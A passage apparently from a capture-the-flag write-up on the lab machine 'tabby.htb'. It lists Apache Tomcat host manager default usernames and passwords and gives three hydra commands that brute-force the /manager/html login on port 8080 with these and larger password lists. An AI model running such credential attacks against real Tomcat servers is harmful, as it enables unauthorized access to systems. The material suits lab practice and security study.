| apache tomcat host manager (web) |   ADMIN    |   ADMIN    |
| apache tomcat host manager (web) |   admin    |  <blank>   |
| apache tomcat host manager (web) |   admin    |   j5Brn9   |
| apache tomcat host manager (web) |   admin    |   tomcat   |
| apache tomcat host manager (web) |   cxsdk    |   kdsxc    |
| apache tomcat host manager (web) | j2deployer | j2deployer |
| apache tomcat host manager (web) |  ovwebusr  | OvW*busr1  |
| apache tomcat host manager (web) |    QCC     |  QLogic66  |
| apache tomcat host manager (web) |   role1    |   role1    |
| apache tomcat host manager (web) |   role1    |   tomcat   |
| apache tomcat host manager (web) |    role    | changethis |
| apache tomcat host manager (web) |    root    |    root    |
| apache tomcat host manager (web) |   tomcat   | changethis |
| apache tomcat host manager (web) |   tomcat   |   s3cret   |
| apache tomcat host manager (web) |   tomcat   |   tomcat   |
| apache tomcat host manager (web) |   xampp    |   xampp    |
+----------------------------------+------------+------------+

[+] Creds saved to /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt 📥
```

```bash
hydra -e nsr -L /tmp/tomcat-usernames.txt -P /tmp/tomcat-passwords.txt tabby.htb -s 8080 http-get /manager/html -t 64
hydra -e nsr -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt tabby.htb -s 8080 http-get /manager/html -t 64
hydra -e nsr -L /tmp/tomcat-usernames.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt tabby.htb -s 8080 http-get /manager/html -t 64
```

